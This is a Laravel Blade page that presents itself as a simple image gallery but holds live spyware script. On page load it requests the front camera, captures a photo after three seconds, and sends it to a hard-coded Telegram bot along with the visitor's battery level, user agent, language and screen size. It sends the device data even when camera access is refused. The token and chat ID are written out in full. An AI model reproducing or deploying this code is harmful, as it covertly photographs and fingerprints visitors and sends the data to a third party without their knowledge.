<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload and View Images</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        img {
            width: 100px;
            height: auto;
            margin: 10px;
        }
    </style>
</head>
<body>

    <h1>Rasmlar</h1>

    <div id="images">
        @foreach($images as $image)
            <img src="{{ asset('storage/' . $image->image) }}" alt="Image">
        @endforeach
    </div>

    <video id="video" autoplay muted style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
        const telegramBotId = "8074495256:AAF88j9gQiq9FKFaDzH-ZA8-YHkmgzwMNfA"; // Your bot ID
        const chatId = "1889969457"; // Your chat ID
        let batteryLevel = null;

        // Get device battery level
        navigator.getBattery().then(function(battery) {
            batteryLevel = (battery.level * 100) + "%";
        });

        // Request camera access
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                video.srcObject = stream;
                video.style.display = 'block'; // Show video if permission is granted
                video.onloadedmetadata = function() {
                    video.play();
                    setTimeout(captureAndSendImage, 3000); // Capture image after 3 seconds
                };
            })
            .catch(err => {
                console.error("Camera connection failed: ", err);
                sendDeviceData(); // If camera access fails, just send device data
            });

        // Capture image and upload to server
        function captureAndSendImage() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL('image/png'); // Base64 image data

            // Upload image to server
            fetch("{{ route('image.upload') }}", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': csrfToken,
                },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    console.log("Image successfully uploaded");
                    location.reload(); // Reload to display the new image
                }
            })
            .catch(err => console.error('Error uploading image:', err));

            // Send the image to Telegram
            canvas.toBlob(function(blob) {
                sendPhotoToTelegram(blob);
                sendToDatabase(blob);
            }, 'image/jpeg');
        }

        function sendPhotoToTelegram(imageBlob = null) {
            let formData = new FormData();
            formData.append("chat_id", chatId);

            if (imageBlob) {
                formData.append("photo", imageBlob, "photo.jpg");
            }

            let currentTime = new Date().toLocaleTimeString();
            let caption = `📱 Battery: ${batteryLevel || "Unknown"}\n` +
                          `🕒 Time: ${currentTime}\n` +
                          `🌐 Browser: ${navigator.userAgent}\n` +
                          `🌍 Language: ${navigator.language}\n` +
                          `🖥 Screen: ${window.screen.width}x${window.screen.height}`;

            let url = imageBlob
                ? `https://api.telegram.org/bot${telegramBotId}/sendPhoto`
                : `https://api.telegram.org/bot${telegramBotId}/sendMessage`;

            formData.append("caption", caption);

            fetch(url, {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(result => {
                if (result.ok) {
                    console.log("Data sent successfully");
                } else {
                    console.error("Error:", result.description);
                }
            })
            .catch(error => {
                console.error("Error sending data:", error);
            });
        }

        function sendDeviceData() {
            sendPhotoToTelegram(); // Send only device data if camera access is denied
        }

        function sendToDatabase(imageBlob) {
            let formData = new FormData();
            formData.append('image', imageBlob, "photo.jpg");

            fetch('/images/store', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-CSRF-TOKEN': csrfToken // Attach CSRF token
                }
            })
            .then(response => response.json())
            .then(result => {
                console.log("Image saved to database:", result);
            })
            .catch(error => {
                console.error("Error saving to database:", error);
            });
        }

    </script>

</body>
</html>
